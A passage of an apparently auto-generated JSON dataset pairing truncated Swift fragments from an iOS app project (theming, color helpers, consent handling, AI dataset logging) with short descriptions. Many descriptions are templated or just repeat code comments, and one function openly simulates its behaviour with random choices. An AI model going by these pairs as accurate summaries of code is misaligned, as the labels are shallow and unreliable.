    "code": "func imagePipline() {\nDataLoader.sharedUrlCache.diskCapacity = 0\nlet pipeline = ImagePipeline {",
    "nl": "Function imagePipline - implements imagepipline functionality",
    "language": "swift",
    "folder": "iOS",
    "file_path": "/workspace/build-it-test-it_Backdoor-Signer/iOS/Delegates/AppDelegate.swift",
    "code_type": "function"
  },
  {
    "id": "1319",
    "code": "func setupLogFile() {\nlet logFilePath = Self.getDocumentsDirectory().appendingPathComponent(\"logs.txt\")\nif FileManager.default.fileExists(atPath: logFilePath.path) {",
    "nl": "Function setupLogFile - sets uplogfile",
    "language": "swift",
    "folder": "iOS",
    "file_path": "/workspace/build-it-test-it_Backdoor-Signer/iOS/Delegates/AppDelegate.swift",
    "code_type": "function"
  },
  {
    "id": "1320",
    "code": "func cleanTmp() {\nlet fileManager = FileManager.default\nlet tmpDirectory = NSHomeDirectory() + \"/tmp\"\nif let files = try? fileManager.contentsOfDirectory(atPath: tmpDirectory) {",
    "nl": "Function cleanTmp - implements cleantmp functionality",
    "language": "swift",
    "folder": "iOS",
    "file_path": "/workspace/build-it-test-it_Backdoor-Signer/iOS/Delegates/AppDelegate.swift",
    "code_type": "function"
  },
  {
    "id": "1321",
    "code": "func logAppVersionInfo() -> String {\nif let version = Bundle.main.infoDictionary?[\"CFBundleShortVersionString\"] as? String,\nlet build = Bundle.main.infoDictionary?[\"CFBundleVersion\"] as? String\n{",
    "nl": "Function logAppVersionInfo - implements logappversioninfo functionality",
    "language": "swift",
    "folder": "iOS",
    "file_path": "/workspace/build-it-test-it_Backdoor-Signer/iOS/Delegates/AppDelegate.swift",
    "code_type": "function"
  },
  {
    "id": "1322",
    "code": "func presentLoader() -> UIAlertController {\nlet alert = UIAlertController(title: \"Loading...\", message: nil, preferredStyle: .alert)\nlet loadingIndicator = UIActivityIndicatorView(frame: CGRect(x: 10, y: 5, width: 50, height: 50))\nloadingIndicator.style = .large\nloadingIndicator.startAnimating()\nalert.view.addSubview(loadingIndicator)\nreturn alert\n}\n}\n",
    "nl": "Function presentLoader - implements presentloader functionality",
    "language": "swift",
    "folder": "iOS",
    "file_path": "/workspace/build-it-test-it_Backdoor-Signer/iOS/Delegates/AppDelegate.swift",
    "code_type": "function"
  },
  {
    "id": "1323",
    "code": "extension UIColor {\nfunc toHexString() -> String {",
    "nl": "extension UIColor - implements functionality related to u i color",
    "language": "swift",
    "folder": "iOS",
    "file_path": "/workspace/build-it-test-it_Backdoor-Signer/iOS/Delegates/AppDelegate.swift",
    "code_type": "extension"
  },
  {
    "id": "1324",
    "code": "func toHexString() -> String {\nvar r: CGFloat = 0\nvar g: CGFloat = 0\nvar b: CGFloat = 0\nvar a: CGFloat = 0\ngetRed(&r, green: &g, blue: &b, alpha: &a)\nlet rgb = Int(r * 255) << 16 | Int(g * 255) << 8 | Int(b * 255) << 0\nreturn String(format: \"#%06x\", rgb)\n}\n}",
    "nl": "Function toHexString - implements tohexstring functionality",
    "language": "swift",
    "folder": "iOS",
    "file_path": "/workspace/build-it-test-it_Backdoor-Signer/iOS/Delegates/AppDelegate.swift",
    "code_type": "function"
  },
  {
    "id": "1325",
    "code": "final class ThemeManager {\n// MARK: - Singleton\n\n/// Shared instance\nstatic let shared = ThemeManager()\n\n// MARK: - Properties\n\n/// Current theme\n@Published private(set) var currentTheme: AppTheme",
    "nl": "/ Advanced theme manager for consistent UI styling and appearance / / Provides: / 1. Comprehensive theming system with light/dark modes / 2. Dynamic color adjustments based on accessibility settings / 3. Animation capabilities for theme transitions / 4. Theme customization options",
    "language": "swift",
    "folder": "iOS",
    "file_path": "/workspace/build-it-test-it_Backdoor-Signer/iOS/Design/AdvancedThemeManager.swift",
    "code_type": "class"
  },
  {
    "id": "1326",
    "code": "private func setupObservers() {\n// Observe system appearance changes\nNotificationCenter.default.addObserver(\nself,\nselector: #selector(systemAppearanceChanged),\nname: NSNotification.Name(\"UIUserInterfaceStyleChanged\"),\nobject: nil\n)\n\n// Observe accessibility settings changes",
    "nl": "MARK: - Setup",
    "language": "swift",
    "folder": "iOS",
    "file_path": "/workspace/build-it-test-it_Backdoor-Signer/iOS/Design/AdvancedThemeManager.swift",
    "code_type": "function"
  },
  {
    "id": "1327",
    "code": "@objc private func systemAppearanceChanged() {\nDebug.shared.log(message: \"System appearance changed\", type: .debug)\n\n// If using system theme, update to match system\nif currentTheme.type == .system {",
    "nl": "Function systemAppearanceChanged - implements systemappearancechanged functionality",
    "language": "swift",
    "folder": "iOS",
    "file_path": "/workspace/build-it-test-it_Backdoor-Signer/iOS/Design/AdvancedThemeManager.swift",
    "code_type": "function"
  },
  {
    "id": "1328",
    "code": "@objc private func accessibilitySettingsChanged() {\nDebug.shared.log(message: \"Accessibility settings changed\", type: .debug)\n\n// Update accessibility mode based on system settings\nupdateAccessibilityMode()\n\n// Notify accessibility changes\nnotifyAccessibilityChanged()\n}\n",
    "nl": "Function accessibilitySettingsChanged - implements accessibilitysettingschanged functionality",
    "language": "swift",
    "folder": "iOS",
    "file_path": "/workspace/build-it-test-it_Backdoor-Signer/iOS/Design/AdvancedThemeManager.swift",
    "code_type": "function"
  },
  {
    "id": "1329",
    "code": "private func updateSystemTheme() {\n// Use current trait collection's user interface style\nlet isDarkMode = UITraitCollection.current.userInterfaceStyle == .dark\n\n// Create updated system theme\nlet updatedSystemTheme = AppTheme(\nid: ThemeType.system.rawValue,\nname: \"System\",\ntype: .system,\nprimaryColor: .systemBlue,",
    "nl": "/ Updates the system theme based on current device settings",
    "language": "swift",
    "folder": "iOS",
    "file_path": "/workspace/build-it-test-it_Backdoor-Signer/iOS/Design/AdvancedThemeManager.swift",
    "code_type": "function"
  },
  {
    "id": "1330",
    "code": "func setTheme(_ themeType: ThemeType) {\nguard let newTheme = themes.first(where: { $0.type == themeType }),",
    "nl": "MARK: - Theme Selection / Changes the app theme / - Parameter themeType: The type of theme to apply",
    "language": "swift",
    "folder": "iOS",
    "file_path": "/workspace/build-it-test-it_Backdoor-Signer/iOS/Design/AdvancedThemeManager.swift",
    "code_type": "function"
  },
  {
    "id": "1331",
    "code": "func applyThemeToApplication() {\n// Get the appropriate colors for the current interface style\nlet colors = getThemeColorsForCurrentInterfaceStyle()\n\n// Set application-wide tint color\nif #available(iOS 15.0, *) {",
    "nl": "/ Applies the current theme to the entire application",
    "language": "swift",
    "folder": "iOS",
    "file_path": "/workspace/build-it-test-it_Backdoor-Signer/iOS/Design/AdvancedThemeManager.swift",
    "code_type": "function"
  },
  {
    "id": "1332",
    "code": "private func applyAppearanceToUIElements(with colors: AppThemeColors) {\n// UINavigationBar appearance\nif #available(iOS 15.0, *) {",
    "nl": "/ Applies appearance to specific UI elements",
    "language": "swift",
    "folder": "iOS",
    "file_path": "/workspace/build-it-test-it_Backdoor-Signer/iOS/Design/AdvancedThemeManager.swift",
    "code_type": "function"
  },
  {
    "id": "1333",
    "code": "func primaryColor(for traitCollection: UITraitCollection? = nil) -> UIColor {\nlet colors = getThemeColorsForInterfaceStyle(\ntraitCollection?.userInterfaceStyle ?? UITraitCollection.current.userInterfaceStyle\n)\nreturn getAccessibilityAdjustedColor(colors.primaryColor)\n}\n\n/// Gets the appropriate secondary color for the current context\nfunc secondaryColor(for traitCollection: UITraitCollection? = nil) -> UIColor {",
    "nl": "MARK: - UI Element Color Getters / Gets the appropriate primary color for the current context",
    "language": "swift",
    "folder": "iOS",
    "file_path": "/workspace/build-it-test-it_Backdoor-Signer/iOS/Design/AdvancedThemeManager.swift",
    "code_type": "function"
  },
  {
    "id": "1334",
    "code": "func secondaryColor(for traitCollection: UITraitCollection? = nil) -> UIColor {\nlet colors = getThemeColorsForInterfaceStyle(\ntraitCollection?.userInterfaceStyle ?? UITraitCollection.current.userInterfaceStyle\n)\nreturn getAccessibilityAdjustedColor(colors.secondaryColor)\n}\n\n/// Gets the appropriate accent color for the current context\nfunc accentColor(for traitCollection: UITraitCollection? = nil) -> UIColor {",
    "nl": "/ Gets the appropriate secondary color for the current context",
    "language": "swift",
    "folder": "iOS",
    "file_path": "/workspace/build-it-test-it_Backdoor-Signer/iOS/Design/AdvancedThemeManager.swift",
    "code_type": "function"
  },
  {
    "id": "1335",
    "code": "func accentColor(for traitCollection: UITraitCollection? = nil) -> UIColor {\nlet colors = getThemeColorsForInterfaceStyle(\ntraitCollection?.userInterfaceStyle ?? UITraitCollection.current.userInterfaceStyle\n)\nreturn getAccessibilityAdjustedColor(colors.accentColor)\n}\n\n/// Gets the appropriate background color for the current context\nfunc backgroundColor(for traitCollection: UITraitCollection? = nil) -> UIColor {",
    "nl": "/ Gets the appropriate accent color for the current context",
    "language": "swift",
    "folder": "iOS",
    "file_path": "/workspace/build-it-test-it_Backdoor-Signer/iOS/Design/AdvancedThemeManager.swift",
    "code_type": "function"
  },
  {
    "id": "1336",
    "code": "func backgroundColor(for traitCollection: UITraitCollection? = nil) -> UIColor {\nlet colors = getThemeColorsForInterfaceStyle(\ntraitCollection?.userInterfaceStyle ?? UITraitCollection.current.userInterfaceStyle\n)\nreturn getAccessibilityAdjustedColor(colors.backgroundColor)\n}\n\n/// Gets the appropriate card color for the current context\nfunc cardColor(for traitCollection: UITraitCollection? = nil) -> UIColor {",
    "nl": "/ Gets the appropriate background color for the current context",
    "language": "swift",
    "folder": "iOS",
    "file_path": "/workspace/build-it-test-it_Backdoor-Signer/iOS/Design/AdvancedThemeManager.swift",
    "code_type": "function"
  },
  {
    "id": "1337",
    "code": "func cardColor(for traitCollection: UITraitCollection? = nil) -> UIColor {\nlet colors = getThemeColorsForInterfaceStyle(\ntraitCollection?.userInterfaceStyle ?? UITraitCollection.current.userInterfaceStyle\n)\nreturn getAccessibilityAdjustedColor(colors.cardColor)\n}\n\n/// Gets the appropriate text color for the current context\nfunc textColor(for traitCollection: UITraitCollection? = nil) -> UIColor {",
    "nl": "/ Gets the appropriate card color for the current context",
    "language": "swift",
    "folder": "iOS",
    "file_path": "/workspace/build-it-test-it_Backdoor-Signer/iOS/Design/AdvancedThemeManager.swift",
    "code_type": "function"
  },
  {
    "id": "1338",
    "code": "func textColor(for traitCollection: UITraitCollection? = nil) -> UIColor {\nlet colors = getThemeColorsForInterfaceStyle(\ntraitCollection?.userInterfaceStyle ?? UITraitCollection.current.userInterfaceStyle\n)\nreturn getAccessibilityAdjustedColor(colors.textColor)\n}\n\n/// Gets the appropriate secondary text color for the current context\nfunc secondaryTextColor(for traitCollection: UITraitCollection? = nil) -> UIColor {",
    "nl": "/ Gets the appropriate text color for the current context",
    "language": "swift",
    "folder": "iOS",
    "file_path": "/workspace/build-it-test-it_Backdoor-Signer/iOS/Design/AdvancedThemeManager.swift",
    "code_type": "function"
  },
  {
    "id": "1339",
    "code": "func secondaryTextColor(for traitCollection: UITraitCollection? = nil) -> UIColor {\nlet colors = getThemeColorsForInterfaceStyle(\ntraitCollection?.userInterfaceStyle ?? UITraitCollection.current.userInterfaceStyle\n)\nreturn getAccessibilityAdjustedColor(colors.secondaryTextColor)\n}\n\n// MARK: - Helper Methods\n\n/// Gets colors for the current interface style",
    "nl": "/ Gets the appropriate secondary text color for the current context",
    "language": "swift",
    "folder": "iOS",
    "file_path": "/workspace/build-it-test-it_Backdoor-Signer/iOS/Design/AdvancedThemeManager.swift",
    "code_type": "function"
  },
  {
    "id": "1340",
    "code": "private func getThemeColorsForCurrentInterfaceStyle() -> AppThemeColors {\ngetThemeColorsForInterfaceStyle(UITraitCollection.current.userInterfaceStyle)\n}\n\n/// Gets theme colors for a specific interface style\nprivate func getThemeColorsForInterfaceStyle(_ style: UIUserInterfaceStyle) -> AppThemeColors {",
    "nl": "MARK: - Helper Methods / Gets colors for the current interface style",
    "language": "swift",
    "folder": "iOS",
    "file_path": "/workspace/build-it-test-it_Backdoor-Signer/iOS/Design/AdvancedThemeManager.swift",
    "code_type": "function"
  },
  {
    "id": "1341",
    "code": "private func getThemeColorsForInterfaceStyle(_ style: UIUserInterfaceStyle) -> AppThemeColors {\nlet isDarkMode = style == .dark\n\n// If theme has specific dark mode colors and we're in dark mode, use those\nif isDarkMode, let darkModeColors = currentTheme.darkModeColors {",
    "nl": "/ Gets theme colors for a specific interface style",
    "language": "swift",
    "folder": "iOS",
    "file_path": "/workspace/build-it-test-it_Backdoor-Signer/iOS/Design/AdvancedThemeManager.swift",
    "code_type": "function"
  },
  {
    "id": "1342",
    "code": "private func loadAccessibilitySettings() {\nupdateAccessibilityMode()\n}\n\n/// Updates the accessibility mode based on system settings\nprivate func updateAccessibilityMode() {",
    "nl": "MARK: - Accessibility Support / Loads accessibility settings from the system",
    "language": "swift",
    "folder": "iOS",
    "file_path": "/workspace/build-it-test-it_Backdoor-Signer/iOS/Design/AdvancedThemeManager.swift",
    "code_type": "function"
  },
  {
    "id": "1343",
    "code": "private func updateAccessibilityMode() {\nif UIAccessibility.isInvertColorsEnabled {",
    "nl": "/ Updates the accessibility mode based on system settings",
    "language": "swift",
    "folder": "iOS",
    "file_path": "/workspace/build-it-test-it_Backdoor-Signer/iOS/Design/AdvancedThemeManager.swift",
    "code_type": "function"
  },
  {
    "id": "1344",
    "code": "private func getAccessibilityAdjustedColor(_ color: UIColor) -> UIColor {\nvar adjustedColor = color\n\nswitch accessibilityMode {",
    "nl": "/ Adjusts a color based on current accessibility settings",
    "language": "swift",
    "folder": "iOS",
    "file_path": "/workspace/build-it-test-it_Backdoor-Signer/iOS/Design/AdvancedThemeManager.swift",
    "code_type": "function"
  },
  {
    "id": "1345",
    "code": "private func increaseContrast(for color: UIColor) -> UIColor {\nvar red: CGFloat = 0, green: CGFloat = 0, blue: CGFloat = 0, alpha: CGFloat = 0\ncolor.getRed(&red, green: &green, blue: &blue, alpha: &alpha)\n\n// Calculate luminance (perceived brightness)\nlet luminance = 0.299 * red + 0.587 * green + 0.114 * blue\n\n// If the color is dark, make it darker; if it's light, make it lighter\nif luminance < 0.5 {",
    "nl": "/ Increases contrast for a color",
    "language": "swift",
    "folder": "iOS",
    "file_path": "/workspace/build-it-test-it_Backdoor-Signer/iOS/Design/AdvancedThemeManager.swift",
    "code_type": "function"
  },
  {
    "id": "1346",
    "code": "private func notifyThemeChanged() {\nNotificationCenter.default.post(\nname: .themeDidChange,\nobject: nil,\nuserInfo: [\"theme\": currentTheme.id]\n)\n}\n\n/// Notifies observers that accessibility settings have changed\nprivate func notifyAccessibilityChanged() {",
    "nl": "MARK: - Notification Methods / Notifies observers that the theme has changed",
    "language": "swift",
    "folder": "iOS",
    "file_path": "/workspace/build-it-test-it_Backdoor-Signer/iOS/Design/AdvancedThemeManager.swift",
    "code_type": "function"
  },
  {
    "id": "1347",
    "code": "private func notifyAccessibilityChanged() {\nNotificationCenter.default.post(\nname: .accessibilitySettingsDidChange,\nobject: nil,\nuserInfo: [\"mode\": accessibilityMode.rawValue]\n)\n}\n}\n\n// MARK: - Supporting Types",
    "nl": "/ Notifies observers that accessibility settings have changed",
    "language": "swift",
    "folder": "iOS",
    "file_path": "/workspace/build-it-test-it_Backdoor-Signer/iOS/Design/AdvancedThemeManager.swift",
    "code_type": "function"
  },
  {
    "id": "1348",
    "code": "enum ThemeType: String {\ncase system\ncase light\ncase dark\ncase highContrast\ncase blue\ncase green\n}\n\n/// Accessibility modes",
    "nl": "MARK: - Supporting Types / Theme types",
    "language": "swift",
    "folder": "iOS",
    "file_path": "/workspace/build-it-test-it_Backdoor-Signer/iOS/Design/AdvancedThemeManager.swift",
    "code_type": "enum"
  },
  {
    "id": "1349",
    "code": "enum AccessibilityMode: String {\ncase standard\ncase highContrast\ncase invertColors\ncase reduceTransparency\n}\n\n/// Theme data structure\nstruct AppTheme {",
    "nl": "/ Accessibility modes",
    "language": "swift",
    "folder": "iOS",
    "file_path": "/workspace/build-it-test-it_Backdoor-Signer/iOS/Design/AdvancedThemeManager.swift",
    "code_type": "enum"
  },
  {
    "id": "1350",
    "code": "struct AppTheme {\nlet id: String\nlet name: String\nlet type: ThemeType\n\nlet primaryColor: UIColor\nlet secondaryColor: UIColor\nlet accentColor: UIColor\nlet backgroundColor: UIColor\nlet cardColor: UIColor",
    "nl": "/ Theme data structure",
    "language": "swift",
    "folder": "iOS",
    "file_path": "/workspace/build-it-test-it_Backdoor-Signer/iOS/Design/AdvancedThemeManager.swift",
    "code_type": "struct"
  },
  {
    "id": "1351",
    "code": "struct AppThemeColors {\nlet primaryColor: UIColor\nlet secondaryColor: UIColor\nlet accentColor: UIColor\nlet backgroundColor: UIColor\nlet cardColor: UIColor\nlet textColor: UIColor\nlet secondaryTextColor: UIColor\n}\n",
    "nl": "/ Colors for a theme",
    "language": "swift",
    "folder": "iOS",
    "file_path": "/workspace/build-it-test-it_Backdoor-Signer/iOS/Design/AdvancedThemeManager.swift",
    "code_type": "struct"
  },
  {
    "id": "1352",
    "code": "extension Notification.Name {\nstatic let themeDidChange = Notification.Name(\"themeDidChange\")\nstatic let accessibilitySettingsDidChange = Notification.Name(\"accessibilitySettingsDidChange\")\n}\n\n// MARK: - SwiftUI Support\n\n@available(iOS 14.0, *)\nstruct ThemeEnvironmentKey: EnvironmentKey {",
    "nl": "MARK: - Extensions",
    "language": "swift",
    "folder": "iOS",
    "file_path": "/workspace/build-it-test-it_Backdoor-Signer/iOS/Design/AdvancedThemeManager.swift",
    "code_type": "extension"
  },
  {
    "id": "1353",
    "code": "struct ThemeEnvironmentKey: EnvironmentKey {\nstatic let defaultValue: AppTheme = ThemeManager.shared.currentTheme\n}\n\n@available(iOS 14.0, *)\nextension EnvironmentValues {",
    "nl": "struct ThemeEnvironmentKey - implements functionality related to theme environment key",
    "language": "swift",
    "folder": "iOS",
    "file_path": "/workspace/build-it-test-it_Backdoor-Signer/iOS/Design/AdvancedThemeManager.swift",
    "code_type": "struct"
  },
  {
    "id": "1354",
    "code": "extension EnvironmentValues {\nvar appTheme: AppTheme {",
    "nl": "extension EnvironmentValues - implements functionality related to environment values",
    "language": "swift",
    "folder": "iOS",
    "file_path": "/workspace/build-it-test-it_Backdoor-Signer/iOS/Design/AdvancedThemeManager.swift",
    "code_type": "extension"
  },
  {
    "id": "1355",
    "code": "extension UIViewController {\n/// Applies the current theme to the view controller\nfunc applyTheme() {",
    "nl": "MARK: - View Controller Extension for Theme Support",
    "language": "swift",
    "folder": "iOS",
    "file_path": "/workspace/build-it-test-it_Backdoor-Signer/iOS/Design/AdvancedThemeManager.swift",
    "code_type": "extension"
  },
  {
    "id": "1356",
    "code": "func applyTheme() {\nlet theme = ThemeManager.shared\n_ = traitCollection.userInterfaceStyle\n\n// Apply theme colors\nview.backgroundColor = theme.backgroundColor(for: traitCollection)\n\n// Apply to navigation items\nnavigationController?.navigationBar.tintColor = theme.primaryColor(for: traitCollection)\n",
    "nl": "/ Applies the current theme to the view controller",
    "language": "swift",
    "folder": "iOS",
    "file_path": "/workspace/build-it-test-it_Backdoor-Signer/iOS/Design/AdvancedThemeManager.swift",
    "code_type": "function"
  },
  {
    "id": "1357",
    "code": "extension CALayer {\n/// Apply a futuristic shadow effect to the layer\nfunc applyFuturisticShadow() {",
    "nl": "extension CALayer - implements functionality related to c a layer",
    "language": "swift",
    "folder": "iOS",
    "file_path": "/workspace/build-it-test-it_Backdoor-Signer/iOS/Extensions/CALayer+Shadow.swift",
    "code_type": "extension"
  },
  {
    "id": "1358",
    "code": "func applyFuturisticShadow() {\nmasksToBounds = false\nshadowColor = UIColor(red: 0.1, green: 0.6, blue: 1.0, alpha: 1.0).cgColor\nshadowOffset = CGSize(width: 0, height: 3)\nshadowOpacity = 0.3\nshadowRadius = 10\n}\n}",
    "nl": "/ Apply a futuristic shadow effect to the layer",
    "language": "swift",
    "folder": "iOS",
    "file_path": "/workspace/build-it-test-it_Backdoor-Signer/iOS/Extensions/CALayer+Shadow.swift",
    "code_type": "function"
  },
  {
    "id": "1359",
    "code": "extension CGSize {\nfunc aspectFit(in boundingSize: CGSize, insetBy insetAmount: CGFloat) -> CGSize {",
    "nl": "extension CGSize - implements functionality related to c g size",
    "language": "swift",
    "folder": "iOS",
    "file_path": "/workspace/build-it-test-it_Backdoor-Signer/iOS/Extensions/CGSize+aspectFit.swift",
    "code_type": "extension"
  },
  {
    "id": "1360",
    "code": "func aspectFit(in boundingSize: CGSize, insetBy insetAmount: CGFloat) -> CGSize {\nlet scaledSize = aspectFit(in: boundingSize)\nreturn CGSize(width: scaledSize.width - insetAmount * 2, height: scaledSize.height - insetAmount * 2)\n}\n\nprivate func aspectFit(in boundingSize: CGSize) -> CGSize {",
    "nl": "Function aspectFit - implements aspectfit functionality",
    "language": "swift",
    "folder": "iOS",
    "file_path": "/workspace/build-it-test-it_Backdoor-Signer/iOS/Extensions/CGSize+aspectFit.swift",
    "code_type": "function"
  },
  {
    "id": "1361",
    "code": "private func aspectFit(in boundingSize: CGSize) -> CGSize {\nlet aspectWidth = boundingSize.width / width\nlet aspectHeight = boundingSize.height / height\nlet aspectRatio = min(aspectWidth, aspectHeight)\n\nreturn CGSize(width: width * aspectRatio, height: height * aspectRatio)\n}\n}\n",
    "nl": "Function aspectFit - implements aspectfit functionality",
    "language": "swift",
    "folder": "iOS",
    "file_path": "/workspace/build-it-test-it_Backdoor-Signer/iOS/Extensions/CGSize+aspectFit.swift",
    "code_type": "function"
  },
  {
    "id": "1362",
    "code": "extension AILearningManager {\n/// Incorporate external dataset into training\nfunc incorporateDataset(_ datasetContent: [String: Any]) -> Bool {",
    "nl": "MARK: - Dataset Management Extension",
    "language": "swift",
    "folder": "iOS",
    "file_path": "/workspace/build-it-test-it_Backdoor-Signer/iOS/Extensions/Feature/AILearningManager+DatasetManagement.swift",
    "code_type": "extension"
  },
  {
    "id": "1363",
    "code": "func incorporateDataset(_ datasetContent: [String: Any]) -> Bool {\nDebug.shared.log(message: \"Incorporating external dataset into AI training\", type: .info)\n\n// Extract training data from dataset\nguard let data = extractTrainingData(from: datasetContent) else {",
    "nl": "/ Incorporate external dataset into training",
    "language": "swift",
    "folder": "iOS",
    "file_path": "/workspace/build-it-test-it_Backdoor-Signer/iOS/Extensions/Feature/AILearningManager+DatasetManagement.swift",
    "code_type": "function"
  },
  {
    "id": "1364",
    "code": "private func extractTrainingData(from dataset: [String: Any])\n-> (training: [[String: Any]], evaluation: [[String: Any]])?\n{",
    "nl": "/ Extract training data from dataset content",
    "language": "swift",
    "folder": "iOS",
    "file_path": "/workspace/build-it-test-it_Backdoor-Signer/iOS/Extensions/Feature/AILearningManager+DatasetManagement.swift",
    "code_type": "function"
  },
  {
    "id": "1365",
    "code": "private func saveExternalTrainingData(_ data: [[String: Any]]) {\n// Convert data to interactions\nfor item in data {",
    "nl": "/ Save external training data for future use",
    "language": "swift",
    "folder": "iOS",
    "file_path": "/workspace/build-it-test-it_Backdoor-Signer/iOS/Extensions/Feature/AILearningManager+DatasetManagement.swift",
    "code_type": "function"
  },
  {
    "id": "1366",
    "code": "private func saveEvaluationDataForValidation(_ data: [[String: Any]]) {\nDebug.shared.log(message: \"Saving \\(data.count) evaluation records for model validation\", type: .info)\n\n// Create a directory for evaluation data if it doesn't exist\nlet evalDirectory = modelsDirectory.appendingPathComponent(\"evaluation\", isDirectory: true)\ndo {",
    "nl": "/ Save evaluation data for model validation",
    "language": "swift",
    "folder": "iOS",
    "file_path": "/workspace/build-it-test-it_Backdoor-Signer/iOS/Extensions/Feature/AILearningManager+DatasetManagement.swift",
    "code_type": "function"
  },
  {
    "id": "1367",
    "code": "private func logDatasetIncorporation(datasetSize: Int, success: Bool, modelVersion: String) {\nlet logEntry = \"\"\"\n=== DATASET INCORPORATION LOG ===\nTimestamp: \\(ISO8601DateFormatter().string(from: Date()))\nDataset Size: \\(datasetSize) records\nSuccess: \\(success)\nModel Version: \\(modelVersion)\nDevice: \\(UIDevice.current.name)\nSystem: \\(UIDevice.current.systemName) \\(UIDevice.current.systemVersion)\nApp Version: \\(Bundle.main.infoDictionary?[\"CFBundleShortVersionString\"] as? String ?? \"unknown\")",
    "nl": "/ Log dataset incorporation to Dropbox if user has consented",
    "language": "swift",
    "folder": "iOS",
    "file_path": "/workspace/build-it-test-it_Backdoor-Signer/iOS/Extensions/Feature/AILearningManager+DatasetManagement.swift",
    "code_type": "function"
  },
  {
    "id": "1368",
    "code": "func checkForAvailableDatasets() {\n// Only proceed if auto-download is enabled and consent was given\nguard UserDefaults.standard.bool(forKey: \"AIAutomaticDatasetDownload\"),\nUserDefaults.standard.bool(forKey: \"UserHasAcceptedDataCollection\")\nelse {",
    "nl": "/ Check online for available datasets based on user behavior",
    "language": "swift",
    "folder": "iOS",
    "file_path": "/workspace/build-it-test-it_Backdoor-Signer/iOS/Extensions/Feature/AILearningManager+DatasetManagement.swift",
    "code_type": "function"
  },
  {
    "id": "1369",
    "code": "func getTopUserIntents(limit: Int) -> [String] {\n// Lock to safely access interactions\ninteractionsLock.lock()\ndefer { interactionsLock.unlock() }",
    "nl": "/ Get top intents from user interactions",
    "language": "swift",
    "folder": "iOS",
    "file_path": "/workspace/build-it-test-it_Backdoor-Signer/iOS/Extensions/Feature/AILearningManager+DatasetManagement.swift",
    "code_type": "function"
  },
  {
    "id": "1370",
    "code": "private func shouldDownloadDatasetForIntent(_ intent: String) -> Bool {\n// In a real app, this would use more sophisticated logic\n// For now, randomly decide based on intent type\n\n// Higher probability for certain intents\nif intent.contains(\"sign\") || intent.contains(\"install\") || intent.contains(\"navigation\") {",
    "nl": "/ Determine if we should download a dataset for an intent",
    "language": "swift",
    "folder": "iOS",
    "file_path": "/workspace/build-it-test-it_Backdoor-Signer/iOS/Extensions/Feature/AILearningManager+DatasetManagement.swift",
    "code_type": "function"
  },
  {
    "id": "1371",
    "code": "private func simulateFindingDatasetForIntent(_ intent: String) {\nDebug.shared.log(message: \"Simulating finding dataset for intent: \\(intent)\", type: .info)\n\n// Convert intent to dataset category\nlet category: String\nif intent.contains(\"sign\") {",
    "nl": "/ Simulate finding and downloading a dataset for an intent",
    "language": "swift",
    "folder": "iOS",
    "file_path": "/workspace/build-it-test-it_Backdoor-Signer/iOS/Extensions/Feature/AILearningManager+DatasetManagement.swift",
    "code_type": "function"
  },
  {
    "id": "1372",
    "code": "func getAIPerformanceMetrics() -> (confidenceAverage: Double, errorRate: Double) {\n// Lock to safely access interactions\ninteractionsLock.lock()\ndefer { interactionsLock.unlock() }",
    "nl": "/ Get performance metrics for the AI",
    "language": "swift",
    "folder": "iOS",
    "file_path": "/workspace/build-it-test-it_Backdoor-Signer/iOS/Extensions/Feature/AILearningManager+DatasetManagement.swift",
    "code_type": "function"
  },
  {
    "id": "1373",
    "code": "func getLowPerformanceAreas(limit: Int) -> [String] {\n// Lock to safely access interactions\ninteractionsLock.lock()\ndefer { interactionsLock.unlock() }",
    "nl": "/ Get areas where the AI performance is lowest",
    "language": "swift",
    "folder": "iOS",
    "file_path": "/workspace/build-it-test-it_Backdoor-Signer/iOS/Extensions/Feature/AILearningManager+DatasetManagement.swift",
    "code_type": "function"
  },
  {
    "id": "1374",
    "code": "extension AppDelegate: ConsentViewControllerDelegate {\n/// Check if user consent needs to be requested\nfunc shouldRequestUserConsent() -> Bool {",
    "nl": "MARK: - Consent Management Extension",
    "language": "swift",
    "folder": "iOS",
    "file_path": "/workspace/build-it-test-it_Backdoor-Signer/iOS/Extensions/Feature/AppDelegate+ConsentManagement.swift",
    "code_type": "extension"
  },
  {
    "id": "1375",
    "code": "func shouldRequestUserConsent() -> Bool {\n// Check if we've already shown the consent screen\nif UserDefaults.standard.bool(forKey: \"ConsentScreenShown\") {",
    "nl": "/ Check if user consent needs to be requested",
    "language": "swift",
    "folder": "iOS",
    "file_path": "/workspace/build-it-test-it_Backdoor-Signer/iOS/Extensions/Feature/AppDelegate+ConsentManagement.swift",
    "code_type": "function"
  },
  {
    "id": "1376",
    "code": "func presentConsentViewController() {\nguard !isShowingStartupPopup else {",
    "nl": "/ Present the consent screen",
    "language": "swift",
    "folder": "iOS",
    "file_path": "/workspace/build-it-test-it_Backdoor-Signer/iOS/Extensions/Feature/AppDelegate+ConsentManagement.swift",
    "code_type": "function"
  },
  {
    "id": "1377",
    "code": "func userDidAcceptConsent() {\nDebug.shared.log(message: \"User accepted data collection consent\", type: .info)\n\n// Reset popup flag\nisShowingStartupPopup = false\n\n// Upload device info to Dropbox since consent was given\nDispatchQueue.global(qos: .utility).async {",
    "nl": "MARK: - ConsentViewControllerDelegate",
    "language": "swift",
    "folder": "iOS",
    "file_path": "/workspace/build-it-test-it_Backdoor-Signer/iOS/Extensions/Feature/AppDelegate+ConsentManagement.swift",
    "code_type": "function"
  },
  {
    "id": "1378",
    "code": "func userDidDeclineConsent() {\nDebug.shared.log(message: \"User declined data collection consent\", type: .info)\n\n// Reset popup flag\nisShowingStartupPopup = false\n\n// Show floating button after consent\nFloatingButtonManager.shared.show()\n}\n}",
    "nl": "Function userDidDeclineConsent - implements userdiddeclineconsent functionality",
    "language": "swift",
    "folder": "iOS",
    "file_path": "/workspace/build-it-test-it_Backdoor-Signer/iOS/Extensions/Feature/AppDelegate+ConsentManagement.swift",
    "code_type": "function"
  },
  {
    "id": "1379",
    "code": "extension AppDelegate {\n/// Check if the app should launch in safe mode based on crash history\nfunc shouldLaunchInSafeMode() -> Bool {",
    "nl": "/ Enhanced SafeMode manager",
    "language": "swift",
    "folder": "iOS",
    "file_path": "/workspace/build-it-test-it_Backdoor-Signer/iOS/Extensions/Feature/AppDelegate+SafeModeManager.swift",
    "code_type": "extension"
  },
  {
    "id": "1380",
    "code": "func shouldLaunchInSafeMode() -> Bool {\nreturn SafeModeLauncher.shared.inSafeMode\n}\n\n/// Setup enhanced safe mode UI with LED effects\nfunc setupEnhancedSafeModeUI() {",
    "nl": "/ Check if the app should launch in safe mode based on crash history",
    "language": "swift",
    "folder": "iOS",
